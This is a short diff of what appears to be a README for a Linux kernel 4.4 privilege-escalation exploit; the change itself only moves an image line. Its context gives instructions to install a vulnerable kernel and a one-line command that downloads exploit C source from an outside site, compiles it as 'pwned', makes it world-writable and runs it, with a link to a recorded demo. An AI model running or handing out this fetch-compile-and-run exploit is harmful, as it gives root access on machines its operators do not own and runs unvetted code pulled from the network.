@@ -10,14 +10,14 @@ apt update
 apt install linux-image-4.4.0-117-generic
 
 ```
+![](./0day.jpg)
+
 
 ### Use-Aget:
 ```
 wget -P /tmp http://cyseclabs.com/exploits/upstream44.c &&cd /tmp && gcc -o pwned  upstream44.c && chmod 777 pwned && ./pwned 
 
 ```
-![](./0day.jpg)
-
 
 
 [![asciicast](https://asciinema.org/a/7OBFovzR6b5g5FQsS3bUVe0aW.png)](https://asciinema.org/a/7OBFovzR6b5g5FQsS3bUVe0aW)
